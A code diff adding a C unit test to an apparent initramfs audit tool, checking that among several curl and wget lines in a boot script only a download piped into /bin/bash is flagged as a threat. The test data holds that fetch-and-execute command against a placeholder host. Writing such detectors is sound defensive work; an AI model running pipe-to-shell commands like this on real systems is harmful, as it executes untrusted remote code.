@@ -166,6 +166,22 @@ static void test_padded_line_detected(void) {
     TEST_PASS("test_padded_line_detected");
 }
 
+static void test_fetch_needs_shell_pipe(void) {
+    TEST_START("test_fetch_needs_shell_pipe");
+    static uint8_t cpio_buf[CPIO_BUF_CAP];
+    static const char script[] =
+        "imgheader=$(curl -sIL \"$liveurl\")\n"          /* dracut livenet: a download, not a payload */
+        "curl -s http://x/a | sha256sum\n"
+        "wget -qO- http://x/b || true\n"
+        "curl -fsSL http://x/c |/bin/bash -s\n";
+    size_t len = cpio_build(cpio_buf, "scripts/init-top/net", script, sizeof(script) - 1);
+    initramfs_scan_result_t res;
+    ASSERT_INT_EQ(initramfs_audit_buffer(cpio_buf, len, &res), BOOTO_OK, "Audit must succeed");
+    ASSERT_INT_EQ(res.threats_detected, 1, "Only the download piped into bash is flagged");
+    ASSERT_INT_EQ((int)res.findings[0].line_number, 4, "Flagged line is the bash pipe");
+    TEST_PASS("test_fetch_needs_shell_pipe");
+}
+
 static void test_exec_capture_output_cap(void) {
     TEST_START("test_exec_capture_output_cap");
     if (!tool_available("head")) return;
@@ -293,6 +309,7 @@ int main(void) {
     test_microcode_plus_zstd_initramfs();
     test_truncated_and_garbage_rejected();
     test_padded_line_detected();
+    test_fetch_needs_shell_pipe();
     test_yara_on_elf_entry();
     test_exec_capture_output_cap();
     test_exec_capture_sandboxed();
